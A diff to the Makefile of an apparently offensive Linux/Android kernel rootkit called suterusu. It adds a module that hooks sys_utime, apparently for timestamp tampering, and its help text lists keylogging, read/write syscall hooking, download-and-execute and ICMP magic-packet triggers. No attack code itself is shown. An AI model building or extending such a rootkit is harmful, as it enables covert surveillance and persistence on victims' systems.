@@ -17,6 +17,10 @@ ifdef HOOKRW
 	MODULES += -D_CONFIG_HOOKRW_
 endif
 
+ifdef HOOKTS
+	suterusu-objs += hookts.o
+	MODULES += -D_CONFIG_HOOKTS_
+endif
 ifdef DLEXEC
 	suterusu-objs += dlexec.o
 	MODULES += -D_CONFIG_DLEXEC_
@@ -45,10 +49,10 @@ default:
 	@echo "android-arm  	Android Linux, ARM"
 	@echo
 	@echo "Supported modules:"
-	@echo "KEYLOGGER    Monitor keystrokes"
 	@echo "  UNLOCK     Unlock the screen upon given key sequence"
 	@echo "  LOGFILE    Log keystrokes to a local file"
 	@echo "HOOKRW       Hook sys_read and sys_write"
+	@echo "HOOKTS       Hook sys_utime"
 	@echo "DLEXEC       Download & execute a binary upon event"
 	@echo "  ICMP       Monitor inbound ICMP for magic packet"
 	
